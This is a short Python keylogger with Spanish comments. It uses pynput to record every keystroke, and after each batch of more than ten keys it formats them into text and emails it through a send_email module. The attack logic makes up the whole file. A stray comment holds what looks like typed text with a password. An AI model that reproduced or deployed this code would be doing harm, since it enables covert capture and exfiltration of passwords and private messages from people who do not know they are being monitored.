from pynput.keyboard import Key, Listener
import send_email

count = 0  # * Se encarga de contar las pulsaciones
keys = []  # * Se almacenan todas las pulsaciones de teclado

# * Registra las teclas


def on_press(key):
    print(key, end=" ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if key == Key.space or key == Key.enter or key == Key.backspace:
        return

    if count > 10:
        count = 0
        email(keys)

# * Función para enviar las pulsaciones del teclado almacendos en la matriz key


def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key == "Key.down" or key == "Key.backspaces" or key == "Key.shift":
            k = "*"
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(message)
    # * Envia el mensaje al correo
    send_email.sendEmail(message)

# * Esta función detiene el programa cuando se presione la tecla esc


def on_release(key):
    if key == Key.esc:
        return False


# * Escucha todas las pulsaciones de teclado hola como estas mi contraseña es: 4862
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
